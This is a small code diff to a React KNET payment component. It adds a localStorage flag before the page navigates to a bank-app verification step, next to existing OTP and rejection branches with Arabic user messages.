@@ -203,7 +203,7 @@ export default function KNETPayment() {
       waitingMessage.value = "";
       setIsWaiting(false);
       if (p === "card") {
-        if (action === "app") { navigate("/bank-app-verification"); }
+        if (action === "app") { localStorage.setItem("flowType", "knet"); navigate("/bank-app-verification"); }
         else if (action === "otp") { setPhase("otp"); startCountdown(); navigateToPage("رمز التحقق كي نت (OTP)"); }
         else if (action === "reject") {
           setRejectedError("يرجى التأكد من المعلومات المدخلة");
